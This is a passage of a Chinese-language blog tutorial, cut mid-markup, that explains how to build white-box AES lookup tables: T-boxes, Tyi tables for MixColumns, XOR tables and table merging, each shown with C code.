encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 成为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>k</mi><mo stretchy="true">^</mo></mover></mrow><annotation encoding="application/x-tex">\widehat{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9344399999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9344399999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span class="svg-align" style="top:-3.69444em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span></span></span></span>。这里最后一个轮密钥不需要改变，因为把行位移提前，其对应的轮密钥更改为了原本它对应轮密钥的前一个，所以最后一个不需变动</li></ol></li></ul><p>​由此具体流程如下</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242256033.png" alt="image-20240124225631973" /></p><h3 id="t-boxs"><a class="markdownIt-Anchor" href="#t-boxs"></a> T-boxs</h3><ul><li>这里将每轮的轮密钥加(AddRoundKey)与字节代换(SubBytes)进行组合，然后得到16个将字节映射到字节的查找表(8bit进，8bit出)。</li><li>下图的 x 为8bit，i 共计16个，代表了16个字节。第10轮的t-box包含了两个轮密钥(k9和k10)的字节，总共160个T-boxs盒。</li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="right left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>T</mi><mi>i</mi><mi>r</mi></msubsup><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mi>S</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo>⊕</mo><msub><mover accent="true"><mi>k</mi><mo stretchy="true">^</mo></mover><mrow><mi>r</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo fence="true">)</mo></mrow><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>for    </mtext><mi>i</mi><mo>=</mo><mn>0</mn><mo>…</mo><mn>15</mn><mtext> and</mtext><mi>r</mi><mo>=</mo><mn>1</mn><mo>…</mo><mn>9</mn><mo separator="true">,</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>T</mi><mi>i</mi><mn>10</mn></msubsup><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mi>S</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo>⊕</mo><msub><mover accent="true"><mi>k</mi><mo stretchy="true">^</mo></mover><mn>9</mn></msub><mrow><mo fence="true">[</mo><mi>i</mi><mo fence="true">]</mo></mrow><mo fence="true">)</mo></mrow><mo>⊕</mo><msub><mi>k</mi><mn>10</mn></msub><mrow><mo fence="true">[</mo><mi>i</mi><mo fence="true">]</mo></mrow><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>for    </mtext><mi>i</mi><mo>=</mo><mn>0</mn><mo>…</mo><mn>15.</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{rll}T_i^r\left(x\right)&amp;=S\left(x\oplus\widehat{k}_{r-1}[i]\right),&amp;\text{for}\ \ \ \ i=0\ldots15\text{ and}r=1\ldots9,\\T_i^{10}\left(x\right)&amp;=S\left(x\oplus\widehat{k}_9\left[i\right]\right)\oplus k_{10}\left[i\right],&amp;\text{for}\ \ \ \ i=0\ldots15.\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-4.05002em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.441336em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-4.05002em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9344399999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span class="svg-align" style="top:-3.69444em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9344399999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span class="svg-align" style="top:-3.69444em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathnormal">i</span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathnormal">i</span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-4.05002em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mord text"><span class="mord">for</span></span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord text"><span class="mord"> and</span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mord text"><span class="mord">for</span></span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord">.</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">u8 TBoxes[<span class="hljs-number">10</span>][<span class="hljs-number">16</span>][<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">GetTbox</span><span class="hljs-params">(u8 key[<span class="hljs-number">176</span>])</span> &#123;<span class="hljs-comment">// 密钥是扩展后的密钥</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt;= <span class="hljs-number">9</span>; r++) &#123;<span class="hljs-comment">// 轮数，这里由10个SubBytes和前10个AddRoundKey组成</span><br>shiftRows (key + <span class="hljs-number">16</span> * r);<span class="hljs-comment">// 这是对于每轮密钥进行行移位处理，每个key的长度为16字节，所以通过16*r来索引下一个key</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = <span class="hljs-number">0</span>; index &lt; <span class="hljs-number">16</span>; index++)<span class="hljs-comment">// 这里的index应该是为了key而存在的，主要目的是根据index去索引每一轮16个字节key的数值，从而异或</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; <span class="hljs-number">256</span>; x++) &#123;<span class="hljs-comment">// 0-255，遍历所有8bit可以得到2^8个结果，由此可以组成一个大小为256的查找表</span><br>TBoxes[r][index][x] = SBox[x^key[<span class="hljs-number">16</span> * r + index]];<br><span class="hljs-keyword">if</span> (r == <span class="hljs-number">9</span>) &#123;<br>TBoxes[r][index][x] = TBoxes[r][index][x]^ key[<span class="hljs-number">16</span> * (r + <span class="hljs-number">1</span>) + index];<span class="hljs-comment">// 这里将最后一轮密钥也加进来了，直接组成了新的查找表</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tyi_tables"><a class="markdownIt-Anchor" href="#tyi_tables"></a> Tyi_tables</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251639492.png" alt="image-20240125163941414" /></p><p>​主要逻辑就是上面这张图，构造 Tyi_tables 的重点就是对于混淆矩阵的处理，它将4x4的混淆矩阵分为4部分(每一列就是一部分)，然后形成了4张表。构造表就是遍历所有的2^8的取值，然后写入表中。若是使用表，则是通过查4张表，再合并处理(异或)，这样就得到了完整的混淆矩阵对于该数据的处理，也就将矩阵相乘转化为了查表。</p><p>​上图对应着4个表的不同生成方法。下面的代码形象化地对应着上图中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mover accent="true"><msub><mi>c</mi><mn>0</mn></msub><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">M\vec{c_0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.864em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>生成过程，从而形成4张表(x代表s)。这里对于s的处理不是简单的&quot;+“，而是由8bit–&gt;32bit的叠加过程(第一个结果占据高8bit，以此类推)，这样进一步压缩了表的空间(之后的操作只需要根据<strong>偏移</strong>来找到特定的结果即可)。最后每个表之间最终的”+&quot;是32bit的异或过程，需要使用之后的XOT tables表来进行处理。</p><p>​最终列混合就转化为4次查表和3次查表异或过程，这就是完整的混淆矩阵相乘的结果</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mi>i</mi><mi>x</mi><mi>C</mi><mi>o</mi><mi>l</mi><mi>u</mi><mi>m</mi><mi>n</mi><mi>s</mi><mo>:</mo><mi>T</mi><msub><mi>y</mi><mn>0</mn></msub><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>⊕</mo><mi>T</mi><msub><mi>y</mi><mn>1</mn></msub><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>⊕</mo><mi>T</mi><msub><mi>y</mi><mn>2</mn></msub><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>⊕</mo><mi>T</mi><msub><mi>y</mi><mn>3</mn></msub><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">MixColumns:Ty_0\left(x\right)\oplus Ty_1\left(x\right)\oplus Ty_2\left(x\right)\oplus Ty_3\left(x\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">i</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">u32 TyiTables[<span class="hljs-number">4</span>][<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">GetTyiTable</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<span class="hljs-comment">// 4张表，对应不同的列混合规则</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; <span class="hljs-number">256</span>; x++) &#123;<span class="hljs-comment">// 2^8种可能输入</span><br>TyiTables[<span class="hljs-number">0</span>][x] = (gMul(<span class="hljs-number">2</span>, x) &lt;&lt; <span class="hljs-number">24</span>) | (x &lt;&lt; <span class="hljs-number">16</span>) | (x &lt;&lt; <span class="hljs-number">8</span>) | gMul(<span class="hljs-number">3</span>, x);<br>TyiTables[<span class="hljs-number">1</span>][x] = (gMul(<span class="hljs-number">3</span>, x) &lt;&lt; <span class="hljs-number">24</span>) | (gMul(<span class="hljs-number">2</span>, x) &lt;&lt; <span class="hljs-number">16</span>) | (x &lt;&lt; <span class="hljs-number">8</span>) | x;<br>TyiTables[<span class="hljs-number">2</span>][x] = (x &lt;&lt; <span class="hljs-number">24</span>) | (gMul(<span class="hljs-number">3</span>, x) &lt;&lt; <span class="hljs-number">16</span>) | (gMul(<span class="hljs-number">2</span>, x) &lt;&lt; <span class="hljs-number">8</span>) | x;<br>TyiTables[<span class="hljs-number">3</span>][x] = (x &lt;&lt; <span class="hljs-number">24</span>) | (x &lt;&lt; <span class="hljs-number">16</span>) | (gMul(<span class="hljs-number">3</span>, x) &lt;&lt; <span class="hljs-number">8</span>) | gMul(<span class="hljs-number">2</span>, x);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="xor-tables"><a class="markdownIt-Anchor" href="#xor-tables"></a> XOR tables</h3><p>Xor tables用于对于每轮当中的两个半字节(4bit)进行一个查表的异或运算，因此我们定义数组为：Xor tables，其中9为轮数，96为一轮所需的异或次数，16为4bit数所有可能值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">u8 xorTable[<span class="hljs-number">9</span>][<span class="hljs-number">96</span>][<span class="hljs-number">16</span>][<span class="hljs-number">16</span>]<span class="hljs-comment">// 这里记住它大小为2^4，4个bit就可以存储</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetxorTable</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;<span class="hljs-comment">// 加密轮数，对于列混合只有九轮</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">96</span>; j++) &#123;<span class="hljs-comment">// 这里为什么是96？我感觉没什么必要，因为9*96个表都是一样的，你要说数据大可以混淆，那我真没话说。这里9迎合加密轮数，96是因为列混合，这里要具体查看下面总结的过程。每一轮列混合要使用3(列混合的三次异或)*8(每次处理4bit，但是列混合后有32bit)=24次异或，然后4次列混合(每次只处理4个字节，共16个字节)，所以24*4=96次</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; <span class="hljs-number">16</span>; x++) &#123;<span class="hljs-comment">//2^4=16，两个4比特数据进行异或</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = <span class="hljs-number">0</span>; y &lt; <span class="hljs-number">16</span>; y++) &#123;<br>xorTable[i][j][x][y] = x^y;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="表合并"><a class="markdownIt-Anchor" href="#表合并"></a> 表合并</h3><p>​T-boxs表于Tyi_tables实际上可以进行合并成为新的表Tyiboxs,组合查找表可以减少执行加密所需的单个表的访问次数。这个合并就是把T-boxs嵌入到Tyi_tables中去，相当于先T-bosx一遍，然后再Tyi_tables。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math 